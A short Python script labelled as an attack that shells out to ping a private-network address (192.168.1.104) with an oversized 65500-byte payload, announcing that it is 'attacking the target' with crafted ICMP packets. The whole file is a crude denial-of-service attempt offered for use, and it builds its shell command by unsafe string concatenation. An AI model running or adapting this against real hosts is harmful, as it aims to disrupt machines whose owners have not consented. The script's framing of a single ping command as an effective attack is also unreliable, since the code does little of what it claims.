import os
import sys
import time

def icmp_start_attack():
    host_ip = "192.168.1.104"
    ip_packet_data = "65500"
    print("Attacking the target with crafted icmp packets")
    os.system("ping " + host_ip + " -l " + ip_packet_data)
icmp_start_attack()
print("attack finished")